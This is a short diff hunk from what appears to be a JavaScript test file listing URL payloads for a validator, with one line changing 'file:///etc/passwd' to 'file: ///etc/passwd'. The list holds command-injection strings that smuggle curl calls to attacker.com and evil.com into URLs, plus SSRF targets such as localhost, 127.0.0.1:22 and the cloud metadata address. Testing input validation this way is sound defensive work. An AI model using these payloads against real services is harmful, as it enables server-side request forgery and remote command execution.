@@ -317,7 +317,7 @@ const testPayloads = [
   'https://example.com & curl attacker.com',
   'https://example.com$(curl evil.com)',
   'https://example.com`curl evil.com`',
-  'file:///etc/passwd',
+  'file: ///etc/passwd',
   'http://localhost:8080/admin',
   'http://127.0.0.1:22',
   'http://169.254.169.254/latest/meta-data/',
